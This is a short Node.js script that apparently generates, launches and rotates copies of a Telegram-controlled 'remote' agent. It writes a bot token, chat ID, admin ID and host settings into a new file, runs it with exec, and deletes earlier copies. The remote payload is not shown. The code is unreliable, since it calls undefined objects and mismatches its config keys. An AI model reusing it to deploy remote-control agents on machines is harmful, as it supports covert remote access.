function createClone(newpassword, remote_basic_info){
    let ahash = crypto.createHash("md5").update((Math.floor(Math.random() * 999999999999) - 100000).toString()).digest('hex').slice(0, 10);
    let starter = `const token = "${remote_basic_info.token}"\nconst chat_group = ${remote_basic_info.chat_group}\nconst portname = "${remote_basic_info.portname}"\nconst passname = "${newpassword}"\nconst admins = []\nconst realadmin = ${remote_basic_info.realadmin}\nconst hostname = "${remote_basic_info.hostname}"\nconst portnumb = ${remote_basic_info.portnumb}\n`;
    let remote_source = fs.readFileSync("remote.js");
    fs.writeFile(combinePath(__dirname, `${realadmin}_${ahash}.js`), starter+remote_source, async (err) => {
        if (err){
            console.log(err);
            await bot.sendMessage(
                chat_group,
                build(`🔴 ${sym} error while creating new remote-file: `) + err.message
            )
        } else {
            await bot.sendMessage(
                chat_group,
                build(`✅ ${sym} new remote-file created, if it goes offline, please told us in `) + `<a href="https://t.me/VexBite">${build("vex group")}</a>`,
                {
                    parse_mode: "HTML"
                }
            ).then(async (rmsg) => {
                exec(`node ${combinePath(__dirname, `${realadmin}_${ahash}.js`)}`);
                fs.readdir(__dirname, (err, files) => {
                    for (let file of files){
                        if (file.startsWith(realadmin)){
                            let spl = file.split("_");
                            if (spl[1] != ahash+".js"){
                                fs.unlinkSync(combinePath(__dirname, file));
                            }
                        }
                    }
                })
                
            });
        }
    })
}

function combinePath(dirname, filename){
    if (dirname.includes("\\")){
        return dirname+"\\"+filename;
    } else if (dirname.includes("/")){
        return dirname+"/"+filename;
    }
}

const crypto = require("crypto");
const fs = require("fs");
const { exec } = require("child_process");
let realadmin = 545435433;

createClone("hello world", {
    token: "374843242:AfdshfyuFDGuySGFuYBXUYfusd",
    chat_group: -76525435435,
    portname: "TrainOXMust",
    password: "TrainOXMust",
    realadmin: 545435433,
    hostname: "127.0.0.1",
    portnumb: 9932
})